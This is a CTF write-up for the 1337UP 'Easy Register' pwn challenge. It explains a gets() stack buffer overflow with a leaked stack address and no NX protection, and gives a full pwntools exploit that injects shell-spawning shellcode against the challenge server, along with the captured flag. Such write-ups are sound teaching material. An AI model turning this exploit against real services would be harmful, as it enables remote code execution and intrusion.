---
title: 1337UP CTF pwn-easyregister
author: jopraveen
date: 2022-03-13
categories: [1337UP]
tags: [CTFtime]
excerpt: Write up for the challenge "Easy Register" from 1337UP CTF
---

## Easy Register

![](https://i.imgur.com/urPqzh3.png)

- First let's download and analyze the binary

#### Info
- ELF 64-bit executable
- Dynamically linked
- Not stripped

**checksec:**

![](https://i.imgur.com/FLpgy9B.png)
- The Stack is executable because NX is disabled
- First let's run the binary and see what it gives

#### Analyzing

```js
➜  pwn  ./easy_register 
  _ _______________ _   _ ____  
 / |___ /___ /___  | | | |  _ \ 
 | | |_ \ |_ \  / /| | | | |_) |
 | |___) |__) |/ / | |_| |  __/ 
 |_|____/____//_/   \___/|_|    
                                
[i] Initialized attendee listing at 0x7ffd0421cac0.
[i] Starting registration application.

Hacker name > jopraveen

[+] Registration completed. Enjoy!
[+] Exiting.
```
- We have a leak `0x7ffd0421cac0`
- Most likely, this will be the starting address of our buffer 
- Then we're prompted to give our name
- May be there's a buffer overflow?
- Let's decompile this binary and see what it does :D

![](https://i.imgur.com/AR1b2AI.png)
- Cool, they're using gets and it's vulnerable to buffer overflow
- Find the offset to Instruction pointer (I didn't mention it in the post because it's very easy)
- Now let's write our exploit

```python
from pwn import *

elf = context.binary = ELF('easy_register')
p = elf.process()
p = remote('easyregister.ctf.intigriti.io',7777)

p.recvuntil('listing at ')
stack_buffer = int(p.recvline().replace(b'.',b''),16)
log.success(f'stack leak: {hex(stack_buffer)}')
```
- First let's store the leak in a variable

```python
payload = asm(shellcraft.sh()) # shellcode
payload += b'A'*(88 - len(payload)) # junk
payload += p64(stack_buffer) # buffer base address
```
- Let's put our shellcode at the beginning and fill some junk until RIP
 
*Note: Offset to RIP is **88*** 

- Finally let's overwrite the Instruction pointer with the leaked value (our input buffer's starting address)

### Full exploit
```python
from pwn import *

elf = context.binary = ELF('easy_register')
p = elf.process()
p = remote('easyregister.ctf.intigriti.io',7777)

p.recvuntil('listing at ')
stack_buffer = int(p.recvline().replace(b'.',b''),16)
log.success(f'stack leak: {hex(stack_buffer)}')

payload = asm(shellcraft.sh())
payload += b'A'*(88 - len(payload))
payload += p64(stack_buffer)

p.sendline(payload)
p.interactive()
```

![](https://i.imgur.com/XzfYQ6L.png)
- We got our flag `1337UP{Y0u_ju5t_r3g15t3r3d_f0r_50m3_p01nt5}`
    
    
    
